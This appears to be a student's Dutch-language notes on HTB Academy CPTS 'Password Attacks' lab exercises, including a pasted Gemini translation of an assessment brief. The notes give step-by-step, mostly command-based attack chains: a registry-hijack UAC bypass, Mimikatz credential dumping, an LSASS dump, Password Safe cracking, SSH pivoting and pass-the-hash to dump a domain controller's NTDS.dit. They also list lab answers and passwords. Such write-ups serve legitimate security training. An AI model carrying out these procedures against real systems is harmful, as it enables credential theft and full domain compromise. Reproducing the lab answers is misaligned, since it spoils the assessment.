5. Voer de Mimikatz commando's uit:
    
    Codefragment
    
    ```
    privilege::debug
    sekurlsa::credman
    ```
    
1. Zoek in de output naar de sectie waar **`User Name : mcharles`** staat en kijk bij **`Password`** onder de `credman` resultaten voor `onedrive.live.com`.


Attacking Windows Credential Manager

Module: Password Attacks
Tags: #CPTS #windows #credentials #mimikatz #uac-bypass #dpapi
Status: ✅ Completed
🎯 Doelstelling

Het wachtwoord extraheren dat mcharles gebruikt voor OneDrive via Windows Credential Manager.

Target: 10.129.15.220 (ACADEMY-PWATTCK-CREDDEV01)
Login: sadams / totally2brow2harmon@
Antwoord: Inlanefreight#2025
🧠 Theorie

Windows Credential Manager slaat credentials op in versleutelde vaults op de volgende locaties:

    %UserProfile%\AppData\Local\Microsoft\Vault\
    %UserProfile%\AppData\Local\Microsoft\Credentials\
    %UserProfile%\AppData\Roaming\Microsoft\Vault\
    %ProgramData%\Microsoft\Vault\
    %SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\

Elke vault bevat een Policy.vpol bestand met AES-sleutels beschermd door DPAPI.

Twee soorten credentials:
Type	Beschrijving
Web Credentials	Websites en online accounts (IE / Edge legacy)
Windows Credentials	Domeingebruikers, netwerkshares, OneDrive, services
⚙️ Aanpak
Stap 1 — Verbinden via RDP
bash

xfreerdp3 /u:sadams /p:'totally2brow2harmon@' /v:10.129.15.220 /cert:ignore /drive:share,/usr/share/windows-resources/mimikatz/x64/

    Met /drive:share,... wordt de Mimikatz map beschikbaar via \\tsclient\share\ op de Windows machine.

Stap 2 — Credentials enumereren met cmdkey
cmd

cmdkey /list

Output:

Target: Domain:interactive=SRV01\mcharles
Type: Domain Password
User: SRV01\mcharles

Stap 3 — Impersoneer mcharles met runas
cmd

runas /savecred /user:SRV01\mcharles cmd

    Omdat de credential opgeslagen is met /savecred, is geen wachtwoord nodig. Er opent een nieuw cmd-venster als mcharles.

Stap 4 — UAC Bypass via computerdefaults.exe

In het mcharles cmd-venster:
cmd

reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe

    Dit opent een elevated cmd-venster zonder UAC-prompt. Werkt doordat computerdefaults.exe een auto-elevated binary is die de registry hijack volgt.

Stap 5 — Mimikatz uitvoeren

In het elevated venster:
cmd

\\tsclient\share\mimikatz.exe

Vervolgens in Mimikatz:

privilege::debug
sekurlsa::credman
vault::cred

Relevante output vault::cred:

TargetName : onedrive.live.com
UserName   : mcharles@inlanefreight.local
Credential : Inlanefreight#2025

🏁 Resultaat
Gebruiker	Service	Wachtwoord
mcharles@inlanefreight.local	onedrive.live.com	Inlanefreight#2025
SRV01\mcharles	Domein	proofs1insight1rustles!
🛠️ Gebruikte Tools
Tool	Gebruik
cmdkey	Opgeslagen credentials enumereren
runas /savecred	Gebruiker impersoneren zonder wachtwoord
reg + computerdefaults.exe	UAC bypass (elevated shell)
mimikatz	Credentials dumpen uit LSASS / vault
📝 Notities

    sekurlsa::credman — dump credentials uit LSASS geheugen (vereist SeDebugPrivilege)
    vault::cred — dump credentials direct uit de Windows Vault
    Alternatieve tools: SharpDPAPI, LaZagne, DonPAPI
    Credential Guard (VBS) beschermt DPAPI master keys op nieuwere systemen

Gemini zei

Hier is de vertaling van de tekst, waarbij de technische termen in de context van cybersecurity behouden of verduidelijkt zijn:
Pagina 26
Vaardigheidsbeoordeling - Wachtwoordaanvallen (Password Attacks)

De Credential Theft Shuffle
De "Credential Theft Shuffle", een term bedacht door Sean Metcalf, is een systematische aanpak die aanvallers gebruiken om Active Directory-omgevingen te compromitteren door misbruik te maken van gestolen inloggegevens (credentials). Het proces begint met het verkrijgen van initiële toegang, vaak via phishing, gevolgd door het verkrijgen van lokale administrator-rechten op een machine. Aanvallers extraheren vervolgens inloggegevens uit het geheugen met tools zoals Mimikatz en gebruiken deze om zich zijwaarts (lateral movement) door het netwerk te verplaatsen. Technieken zoals pass-the-hash (PtH) en tools zoals NetExec vergemakkelijken deze verplaatsing en het verder oogsten van inloggegevens. Het uiteindelijke doel is om privileges te escaleren en controle te krijgen over het domein, vaak door Domain Admin-accounts te compromitteren of DCSync-aanvallen uit te voeren. Sean benadrukt het belang van beveiligingsmaatregelen zoals de Local Administrator Password Solution (LAPS), het afdwingen van multi-factor authenticatie (MFA) en het beperken van administratieve rechten om dergelijke aanvallen te beperken.
Vaardigheidsbeoordeling

Betty Jayde werkt bij Nexura LLC. We weten dat zij het wachtwoord Texas123!@# op meerdere websites gebruikt, en we vermoeden dat ze dit ook op haar werk hergebruikt. Infiltreer het netwerk van Nexura en verkrijg "command execution" (uitvoering van commando's) op de Domain Controller. De volgende hosts vallen binnen de scope van deze beoordeling:
Host	IP-adres
DMZ01	10.129.*.* (Extern), 172.16.119.13 (Intern)
JUMP01	172.16.119.7
FILE01	172.16.119.10
DC01	172.16.119.11
Pivoting Primer (Basiscursus Pivoting)

De interne hosts (JUMP01, FILE01, DC01) bevinden zich op een privaat subnet dat niet direct toegankelijk is vanaf onze aanvalsmachine. Het enige systeem dat van buitenaf bereikbaar is, is DMZ01, die een tweede interface heeft die verbonden is met het interne netwerk. Deze segmentatie weerspiegelt een klassieke DMZ-opstelling, waarbij publiek toegankelijke diensten geïsoleerd zijn van de interne infrastructuur.

Om toegang te krijgen tot deze interne systemen, moeten we eerst een voet aan de grond (foothold) krijgen op DMZ01. Van daaruit kunnen we pivoten — dat wil zeggen, ons verkeer routeren via de gecompromitteerde host naar het private netwerk. Dit stelt onze tools in staat om met interne hosts te communiceren alsof ze direct toegankelijk zijn. Raadpleeg na het compromitteren van de DMZ de "cheatsheet" van de module voor de benodigde commando's om de pivot op te zetten en je beoordeling voort te zetten.

VPN Servers

    Waarschuwing: Telkens wanneer je van server "wisselt", worden je verbindingssleutels opnieuw gegenereerd en moet je je VPN-verbindingsbestand opnieuw downloaden.

    Alle VM-instanties die gekoppeld zijn aan de oude VPN-server worden afgesloten wanneer je overstapt naar een nieuwe VPN-server.

    Bestaande PwnBox-instanties zullen automatisch overschakelen naar de nieuwe VPN-server.

# CPTS - Skills Assessment: Password Attacks

**Module:** Password Attacks  
**Tags:** #CPTS #windows #credentials #mimikatz #pivoting #active-directory  
**Status:** ✅ Completed  

---

## 🎯 Doelstelling

Infiltreer het netwerk van Nexura LLC en verkrijg command execution op de Domain Controller.  
**Uiteindelijk doel:** NTLM hash van `NEXURA\Administrator`  
**Antwoord:** `36e09e1e6ade94d63fbcab5e5b8d6d23`

---

## 🗺️ Netwerk Overzicht

| Host   | IP (Extern)       | IP (Intern)     | Rol              |
|--------|-------------------|-----------------|------------------|
| DMZ01  | 10.129.234.116    | 172.16.119.13   | DMZ / Pivot host |
| JUMP01 | —                 | 172.16.119.7    | Jump server      |
| FILE01 | —                 | 172.16.119.10   | File server      |
| DC01   | —                 | 172.16.119.11   | Domain Controller|

**Bekende info:** Betty Jayde gebruikt wachtwoord `Texas123!@#` op meerdere sites.

---

## ⚙️ Aanpak

### Fase 1 — Toegang tot DMZ01

**Gebruikersnaam achterhalen:**  
Betty Jayde → username formaat = `jbetty`

**SSH verbinding:**
```bash
ssh jbetty@10.129.234.116
# Wachtwoord: Texas123!@#
```

**Credentials gevonden in bash history:**
```bash
cat .bash_history
# Gevonden: sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01
```

---

### Fase 2 — Pivot instellen

**SOCKS proxy via SSH (laat terminal open):**
```bash
ssh -D 9050 -N jbetty@10.129.234.116
```

**Controleer of proxy actief is:**
```bash
ss -tlnp | grep 9050
```

**Controleer proxychains config:**
```bash
tail -5 /etc/proxychains4.conf
# Moet bevatten: socks4 127.0.0.1 9050
```

---

### Fase 3 — Enumerate FILE01 via SMB

**Shares bekijken:**
```bash
proxychains smbclient -L //172.16.119.10/ -U 'nexura.htb/hwilliam%dealer-screwed-gym1'
```

**Verbinden met HR share:**
```bash
proxychains smbclient //172.16.119.10/HR -U 'nexura.htb/hwilliam%dealer-screwed-gym1'
```

**Bestand downloaden:**
```
smb: \> cd Archive
smb: \Archive\> get Employee-Passwords_OLD.psafe3
smb: \Archive\> exit
```

---

### Fase 4 — Password Safe kraken

**Hash extraheren:**
```bash
python3 /usr/share/john/pwsafe2john.py Employee-Passwords_OLD.psafe3 > psafe_hash.txt
```

**Kraken met John:**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt psafe_hash.txt
```

**Master wachtwoord:** `michaeljackson`

**Password Safe openen:**
```bash
sudo apt install passwordsafe -y
pwsafe Employee-Passwords_OLD.psafe3
```

**Gevonden credentials:**

| Gebruiker | Wachtwoord |
|-----------|------------|
| jbetty (DMZ01) | `xiao-nicer-wheels5` |
| bdavid | `caramel-cigars-reply1` |
| stom | `fails-nibble-disturb4` |
| hwilliam | `warned-wobble-occur8` |

---

### Fase 5 — Lateral Movement naar JUMP01

**RDP als bdavid met gedeelde map voor bestandsoverdracht:**
```bash
proxychains xfreerdp3 /u:bdavid /p:'caramel-cigars-reply1' /d:nexura.htb /v:172.16.119.7 /cert:ignore /dynamic-resolution /drive:share,/home/kali/
```

**LSASS dump via Task Manager op JUMP01:**
1. Open Task Manager
2. Tabblad Details
3. Rechtermuisknop op `lsass.exe` → Create dump file
4. Kopieer `lsass.DMP` naar gedeelde map `\\tsclient\share\`

**Credentials extraheren met pypykatz op Kali:**
```bash
pypykatz lsa minidump lsass.dmp
```

**Gevonden:** `stom` → NTLM hash `21ea958524cfd9a7791737f8d2f764fa`

---

### Fase 6 — Domain Controller compromitteren

**Pass-the-Hash naar DC01 met netexec:**
```bash
proxychains netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M ntdsutil
```

---

## 🏁 Resultaat

| Account | NTLM Hash |
|---------|-----------|
| NEXURA\Administrator | `36e09e1e6ade94d63fbcab5e5b8d6d23` |

---

## 🛠️ Gebruikte Tools

| Tool | Gebruik |
|------|---------|
| `hydra` / `username-anarchy` | Username enumeratie en brute force SSH |
| `ssh -D` | SOCKS proxy voor pivoting |
| `proxychains` | Verkeer routeren via DMZ01 |
| `smbclient` | SMB shares benaderen |
| `john` + `pwsafe2john` | Password Safe kraken |
| `passwordsafe` | Credentials uit .psafe3 lezen |
| `xfreerdp3` | RDP met gedeelde map |
| `pypykatz` | LSASS dump analyseren |
| `netexec` + ntdsutil | NTDS.dit dumpen via Pass-the-Hash |

---

## 📝 Credential Overzicht

| Gebruiker | Wachtwoord | NTLM Hash | Bron |
|-----------|------------|-----------|------|
| jbetty | `Texas123!@#` | — | Initieel gegeven |
| hwilliam | `dealer-screwed-gym1` | — | bash_history DMZ01 |
| bdavid | `caramel-cigars-reply1` | — | Password Safe |
| stom | `fails-nibble-disturb4` | `21ea958524cfd9a7791737f8d2f764fa` | LSASS dump JUMP01 |
| Administrator | — | `36e09e1e6ade94d63fbcab5e5b8d6d23` | NTDS.dit dump DC01 |